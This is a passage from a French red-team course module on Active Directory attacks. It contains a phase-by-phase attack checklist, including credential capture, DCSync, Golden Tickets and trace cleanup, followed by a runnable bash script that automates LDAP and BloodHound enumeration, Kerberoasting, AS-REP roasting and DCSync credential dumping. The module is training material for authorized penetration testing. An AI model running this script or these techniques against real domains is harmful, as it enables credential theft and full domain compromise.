- [ ] Guest account test
- [ ] SMB signing detection (CME)

## Phase 2 : Capture d'identifiants
- [ ] Responder (LLMNR/NBT-NS/MDNS)
- [ ] SMB Relay (si signing désactivé)
- [ ] WPAD poisoning
- [ ] Password spraying
- [ ] Craquage hash (hashcat / john)

## Phase 3 : Énumération
- [ ] LDAP enumeration (ldapsearch, windapsearch)
- [ ] ldapdomaindump (dump complet)
- [ ] BloodHound collecte (SharpHound / BH.py)
- [ ] Import + analyse BloodHound
- [ ] CME : users, groups, shares, sessions
- [ ] Kerberoasting (GetUserSPNs / CME)
- [ ] AS-REP Roasting (GetNPUsers / CME)

## Phase 4 : Exploitation
- [ ] DCSync (secretsdump.py)
- [ ] Extraction NTDS.dit
- [ ] Craquage des hashs NT
- [ ] Pass-the-Hash
- [ ] Exécution distante (wmiexec / psexec / dcomexec)

## Phase 5 : Post-Exploitation
- [ ] Golden Ticket (ticketer.py)
- [ ] Silver Ticket
- [ ] DCSync second DC (si existant)
- [ ] Trust dumping (si trust inter-forêt)
- [ ] Nettoyage des traces

## Rapports
- [ ] Tableau MITRE ATT&CK
- [ ] Heat map des chemins d'attaque
- [ ] Liste des recommandations
- [ ] Extrait des hashs sensibles (proof)
```

### 8.13 Script d'automatisation

```bash
#!/bin/bash
# ─── Script d'automatisation AD Enumeration ──────────────────────────────────
# Utilisation : ./ad-automation.sh <DOMAIN> <DC_IP> <USER> <PASS>
# Auteur : Red Team — SDV M2 2026

DOMAIN=$1
DC_IP=$2
USER=$3
PASS=$4

if [ $# -ne 4 ]; then
    echo "Usage: $0 <DOMAIN> <DC_IP> <USER> <PASS>"
    echo "Ex: $0 sdv-m2.lab 192.168.1.10 jdoe P@ssw0rd"
    exit 1
fi

BASE_DN="DC=$(echo $DOMAIN | sed 's/\./,DC=/g')"

echo "[+] Target: $DOMAIN ($DC_IP)"
echo "[+] User: $USER"
echo "[+] Base DN: $BASE_DN"

mkdir -p exports/auto/{ldap,bloodhound,cme,secrets}

# 1. LDAP Enumeration
echo "[*] Phase 1: LDAP Enumeration..."
ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\\$USER" -w "$PASS" \
  -b "$BASE_DN" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName displayName mail > exports/auto/ldap/users.txt

ldapsearch -x -H ldap://$DC_IP -D "$DOMAIN\\$USER" -w "$PASS" \
  -b "$BASE_DN" "(objectClass=group)" \
  name member > exports/auto/ldap/groups.txt

# 2. BloodHound Collecte
echo "[*] Phase 2: BloodHound Collection..."
bloodhound-python -d $DOMAIN -u $USER -p "$PASS" \
  -dc dc01.$DOMAIN -gc dc01.$DOMAIN \
  -c ALL --zip -ns $DC_IP \
  -o exports/auto/bloodhound/ 2>/dev/null

# 3. CME Enumeration
echo "[*] Phase 3: CrackMapExec..."
crackmapexec smb $DC_IP -u $USER -p "$PASS" --users \
  > exports/auto/cme/users.txt 2>&1
crackmapexec smb $DC_IP -u $USER -p "$PASS" --groups \
  > exports/auto/cme/groups.txt 2>&1
crackmapexec smb $DC_IP -u $USER -p "$PASS" --shares \
  > exports/auto/cme/shares.txt 2>&1
crackmapexec ldap $DC_IP -u $USER -p "$PASS" --kerberoast \
  exports/auto/secrets/kerb-hashes.txt 2>/dev/null
crackmapexec ldap $DC_IP -u $USER -p "$PASS" --asreproast \
  exports/auto/secrets/asrep-hashes.txt 2>/dev/null

# 4. DCSync (si admin)
echo "[*] Phase 4: DCSync..."
secretsdump.py "$DOMAIN/$USER:$PASS"@$DC_IP \
  -just-dc -outputfile exports/auto/secrets/dcsync 2>/dev/null

echo "[+] Done! Check exports/auto/ for results."
```

### 8.14 Ressources complémentaires

#### Outils
- **BloodHound** : https://github.com/BloodHoundAD/BloodHound
- **Responder** : https://github.com/lgandx/Responder
- **CrackMapExec** : https://github.com/byt3bl33d3r/CrackMapExec
- **Impacket** : https://github.com/fortra/impacket
- **Hashcat** : https://github.com/hashcat/hashcat
- **Certipy** : https://github.com/ly4k/Certipy (AD CS exploitation)
- **PKINITtools** : https://github.com/dirkjanm/PKINITtools
- **LAPSToolkit** : https://github.com/leoloobeek/LAPSToolkit
- **PingCastle** : https://github.com/vletoux/pingcastle
- **Purple Knight** : https://www.purpleknight.com/

#### Références
- **MITRE ATT&CK Enterprise Matrix** : https://attack.mitre.org/
- **Active Directory Security** (Sean Metcalf) : https://adsecurity.org/
- **Harmj0y's Blog** : http://blog.harmj0y.net/
- **SpecterOps Blog** : https://posts.specterops.io/
- **Kerberos Attacks** (Microsoft) : https://learn.microsoft.com/en-us/windows-server/security/kerberos/
- **NIS2 Directive** : https://www.enisa.europa.eu/topics/cybersecurity-policy/nis2-directive

#### Wordlists recommandées
- `rockyou.txt` : `/usr/share/wordlists/rockyou.txt`
- `SecLists` : https://github.com/danielmiessler/SecLists
- `OneRuleToRuleThemAll.rule` : règles hashcat

---

## Conclusion

Ce module vous a présenté l'ensemble des techniques fondamentales pour l'attaque d'Active Directory :

1. **Compréhension** de l'architecture AD (domaine, forêt, DC, protocoles)
2. **Énumération** via LDAP avec des outils variés (ldapsearch, windapsearch, ldapdomaindump)
3. **Analyse des relations** avec BloodHound et Neo4j (Cypher queries)
4. **Capture de hashs** avec Responder (empoisonnement LLMNR/NBT-NS)
5. **Cartographie du réseau** avec CrackMapExec (SMB, LDAP, MSSQL, SSH, WinRM)
6. **Exploitation complète** avec Impacket (DCSync, Kerberoasting, exécution distante)
7. **Énumération sans authentification** (NULL sessions, Guest, DNS)
8. **Workflow complet** de la compromission d'un domaine AD

**Prochaine étape :** Module 9 — Attaques avancées AD (AD CS, Kerberos delegation, Golden Ticket, DCSync abus, trusts, forêts, LAPS, GPO abuse, etc.)

---

> **Avertissement légal :** Ces techniques sont présentées uniquement à des fins éducatives et de test d'intrusion autorisé. L'utilisation non autorisée de ces techniques est illégale et contraire à l'éthique. Vous êtes seul responsable de l'utilisation que vous faites de ces connaissances.
